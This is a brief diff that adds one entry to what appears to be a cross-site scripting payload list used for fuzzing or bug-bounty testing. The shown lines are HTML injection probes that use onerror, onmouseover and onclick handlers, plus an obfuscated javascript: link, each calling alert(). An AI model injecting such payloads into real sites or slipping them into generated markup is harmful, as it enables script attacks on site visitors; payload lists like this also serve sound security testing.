@@ -10,3 +10,4 @@
 <img/src=x onerror=alert("XSS peru")>
 <a href="\xE2\x81\x9Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a> <!-- ek aur t shirt -->
 <img/src=x onmouseover=alert(1)>
+<img/src=x onclick=alert(1)>
